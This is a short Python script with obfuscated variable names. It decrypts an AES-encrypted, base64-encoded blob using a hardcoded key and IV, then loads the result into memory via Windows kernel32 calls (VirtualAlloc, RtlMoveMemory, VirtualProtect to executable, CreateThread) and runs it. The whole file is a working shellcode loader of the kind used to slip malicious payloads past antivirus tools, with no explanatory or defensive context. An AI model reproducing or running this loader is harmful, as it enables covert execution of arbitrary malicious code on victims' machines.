import ctypes as rbMtqLuqfKCxqq
from Crypto.Cipher import AES
import base64
MgMPvgPstTdHaU = AES.new('0L|B$s?RvP5(|Aj&!jWFLi!L&JH4HNCz', AES.MODE_CBC, 'KmldWYvHLuNRIeqC')
mJVMmLqy = base64.b64decode('sABLJScDlPp+BD8c4zTAHAS6ofKuKoHbRgWNTKp6i5IUNYt27KPh+bZOtbGReKC+7LweX3jgzBAA/cAX50tf8iHYgkUKHBGHzzFJE48UVmqoSa9I4AIjXvKeTwoi8+njCCb8/gEkloL9guARuLdBexsFnjhyWyui0g59jBlTh49KDXTVLYlZmKOhlApFGMZYz7y1hf+9CRfGrBo61XfHSnvqmfNRUI+wHhIJRvaUVKBKFDlFgDNubUulUrQzSV3Z0IPY4TkYkAtTRJJKfTmbqRRCKtA8sIQMPEXeYS0FunCLTv3QdcAFTeB8+3S7Fu+/PgO7mhlYz0fbg2fuAQA1xvfm/9zsBeebAAeiEYWhdlhJ+bx3bvrRIZ3yIMgjTk9GZFVENgwFFc4loj6qQUTFsPsJOoHZdxCUaCTVt5XlsbLmoEuQl12kzqAE/cFMlO7tZTdt85CKEPEvKk/EEKIQ5A==')
AcUqTpOR = MgMPvgPstTdHaU.decrypt(mJVMmLqy)
rcZIkJNFtBw = rbMtqLuqfKCxqq.windll.kernel32.VirtualAlloc(rbMtqLuqfKCxqq.c_int(0),rbMtqLuqfKCxqq.c_int(len(AcUqTpOR)),rbMtqLuqfKCxqq.c_int(0x3000),rbMtqLuqfKCxqq.c_int(0x04))
rbMtqLuqfKCxqq.windll.kernel32.RtlMoveMemory(rbMtqLuqfKCxqq.c_int(rcZIkJNFtBw),AcUqTpOR,rbMtqLuqfKCxqq.c_int(len(AcUqTpOR)))
aXHzHgUSz = rbMtqLuqfKCxqq.windll.kernel32.VirtualProtect(rbMtqLuqfKCxqq.c_int(rcZIkJNFtBw),rbMtqLuqfKCxqq.c_int(len(AcUqTpOR)),rbMtqLuqfKCxqq.c_int(0x20),rbMtqLuqfKCxqq.byref(rbMtqLuqfKCxqq.c_uint32(0)))
XjcrgNquCeMZAKK = rbMtqLuqfKCxqq.windll.kernel32.CreateThread(rbMtqLuqfKCxqq.c_int(0),rbMtqLuqfKCxqq.c_int(0),rbMtqLuqfKCxqq.c_int(rcZIkJNFtBw),rbMtqLuqfKCxqq.c_int(0),rbMtqLuqfKCxqq.c_int(0),rbMtqLuqfKCxqq.pointer(rbMtqLuqfKCxqq.c_int(0)))
rbMtqLuqfKCxqq.windll.kernel32.WaitForSingleObject(rbMtqLuqfKCxqq.c_int(XjcrgNquCeMZAKK),rbMtqLuqfKCxqq.c_int(-1))
